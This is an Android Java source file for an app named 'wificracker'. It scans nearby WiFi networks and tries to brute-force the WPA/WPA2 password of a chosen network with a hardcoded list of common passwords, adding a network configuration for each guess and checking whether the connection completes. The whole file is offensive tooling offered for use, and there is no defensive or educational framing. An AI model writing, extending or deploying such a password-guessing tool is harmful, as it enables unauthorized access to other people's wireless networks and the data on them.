package com.wificracker;

import android.Manifest;
import android.content.pm.PackageManager;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.os.Handler;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.ListView;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    
    private WifiManager wifiManager;
    private ListView wifiListView;
    private TextView statusTextView;
    private Button scanButton, crackButton;
    private List<ScanResult> wifiList;
    private ArrayAdapter<String> adapter;
    private ArrayList<String> wifiNames;
    private String selectedSSID = "";
    private List<String> passwordList;
    
    private static final int REQUEST_PERMISSIONS = 100;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        initViews();
        setupWifiManager();
        checkPermissions();
        loadPasswordList();
        setupClickListeners();
    }
    
    private void initViews() {
        wifiListView = findViewById(R.id.wifiListView);
        statusTextView = findViewById(R.id.statusTextView);
        scanButton = findViewById(R.id.scanButton);
        crackButton = findViewById(R.id.crackButton);
        
        wifiNames = new ArrayList<>();
        adapter = new ArrayAdapter<>(this, android.R.layout.simple_list_item_1, wifiNames);
        wifiListView.setAdapter(adapter);
    }
    
    private void setupWifiManager() {
        wifiManager = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
        
        if (!wifiManager.isWifiEnabled()) {
            wifiManager.setWifiEnabled(true);
            statusTextView.setText("WiFi ဖွင့်နေသည်...");
        }
    }
    
    private void checkPermissions() {
        String[] permissions = {
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.ACCESS_WIFI_STATE,
            Manifest.permission.CHANGE_WIFI_STATE
        };
        
        List<String> permissionsNeeded = new ArrayList<>();
        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(permission);
            }
        }
        
        if (!permissionsNeeded.isEmpty()) {
            ActivityCompat.requestPermissions(this, 
                permissionsNeeded.toArray(new String[0]), REQUEST_PERMISSIONS);
        }
    }
    
    private void loadPasswordList() {
        passwordList = new ArrayList<>();
        // Common passwords list
        String[] commonPasswords = {
            "12345678", "password", "123456789", "1234567890",
            "123456", "12345", "qwerty", "admin", "welcome",
            "1234", "00000000", "11111111", "password123",
            "123123", "abc123", "admin123", "wifi123",
            "88888888", "1234567", "87654321", "987654321",
            "11223344", "55555555", "66666666", "77777777",
            "99999999", "12341234", "abcd1234", "1234abcd",
            "iloveyou", "password1", "sunshine", "princess",
            "adminadmin", "superman", "football", "monkey",
            "letmein", "trustno1", "dragon", "baseball",
            "qwertyuiop", "1q2w3e4r", "zaq12wsx", "qwerty123"
        };
        
        for (String pass : commonPasswords) {
            passwordList.add(pass);
        }
        statusTextView.setText("Password list loaded: " + passwordList.size() + " passwords");
    }
    
    private void setupClickListeners() {
        scanButton.setOnClickListener(v -> scanWifiNetworks());
        
        crackButton.setOnClickListener(v -> {
            if (!selectedSSID.isEmpty()) {
                startCracking(selectedSSID);
            } else {
                Toast.makeText(this, "WiFi ရွေးပါ", Toast.LENGTH_SHORT).show();
            }
        });
        
        wifiListView.setOnItemClickListener((parent, view, position, id) -> {
            if (wifiList != null && position < wifiList.size()) {
                ScanResult selected = wifiList.get(position);
                selectedSSID = selected.SSID;
                String security = getSecurityType(selected.capabilities);
                statusTextView.setText("Selected: " + selectedSSID + " [" + security + "]");
                crackButton.setEnabled(true);
            }
        });
    }
    
    private void scanWifiNetworks() {
        statusTextView.setText("Scanning WiFi networks...");
        
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
                != PackageManager.PERMISSION_GRANTED) {
            Toast.makeText(this, "Location permission required", Toast.LENGTH_SHORT).show();
            return;
        }
        
        wifiManager.startScan();
        wifiList = wifiManager.getScanResults();
        
        wifiNames.clear();
        for (ScanResult result : wifiList) {
            String security = getSecurityType(result.capabilities);
            String signalStrength = "Signal: " + result.level + "dBm";
            wifiNames.add(result.SSID + "\n" + security + " | " + signalStrength);
        }
        
        adapter.notifyDataSetChanged();
        statusTextView.setText("Found " + wifiList.size() + " WiFi networks");
    }
    
    private String getSecurityType(String capabilities) {
        if (capabilities.contains("WPA2")) {
            return "WPA2";
        } else if (capabilities.contains("WPA")) {
            return "WPA";
        } else if (capabilities.contains("WEP")) {
            return "WEP";
        } else {
            return "OPEN";
        }
    }
    
    private void startCracking(String ssid) {
        crackButton.setEnabled(false);
        statusTextView.setText("Cracking " + ssid + "...");
        
        new Thread(() -> {
            for (String password : passwordList) {
                final String currentPass = password;
                runOnUiThread(() -> statusTextView.setText("Trying: " + currentPass));
                
                if (tryConnect(ssid, password)) {
                    runOnUiThread(() -> {
                        String successMsg = "✓ Password Found!\nSSID: " + ssid + "\nPassword: " + password;
                        statusTextView.setText(successMsg);
                        Toast.makeText(MainActivity.this, successMsg, Toast.LENGTH_LONG).show();
                    });
                    return;
                }
                
                try {
                    Thread.sleep(100);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
            
            runOnUiThread(() -> {
                statusTextView.setText("Password not found in list");
                crackButton.setEnabled(true);
            });
        }).start();
    }
    
    private boolean tryConnect(String ssid, String password) {
        WifiConfiguration wifiConfig = new WifiConfiguration();
        wifiConfig.SSID = String.format("\"%s\"", ssid);
        wifiConfig.preSharedKey = String.format("\"%s\"", password);
        
        wifiConfig.status = WifiConfiguration.Status.ENABLED;
        wifiConfig.allowedGroupCiphers.set(WifiConfiguration.GroupCipher.TKIP);
        wifiConfig.allowedGroupCiphers.set(WifiConfiguration.GroupCipher.CCMP);
        wifiConfig.allowedKeyManagement.set(WifiConfiguration.KeyMgmt.WPA_PSK);
        wifiConfig.allowedPairwiseCiphers.set(WifiConfiguration.PairwiseCipher.TKIP);
        wifiConfig.allowedPairwiseCiphers.set(WifiConfiguration.PairwiseCipher.CCMP);
        wifiConfig.allowedProtocols.set(WifiConfiguration.Protocol.RSN);
        wifiConfig.allowedProtocols.set(WifiConfiguration.Protocol.WPA);
        
        int netId = wifiManager.addNetwork(wifiConfig);
        
        if (netId != -1) {
            wifiManager.disconnect();
            wifiManager.enableNetwork(netId, true);
            wifiManager.reconnect();
            
            try {
                Thread.sleep(3000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            
            WifiInfo wifiInfo = wifiManager.getConnectionInfo();
            boolean isConnected = wifiInfo != null && 
                                 wifiInfo.getNetworkId() == netId &&
                                 wifiInfo.getSupplicantState().toString().equals("COMPLETED");
            
            wifiManager.removeNetwork(netId);
            wifiManager.disconnect();
            
            return isConnected;
        }
        
        return false;
    }
}
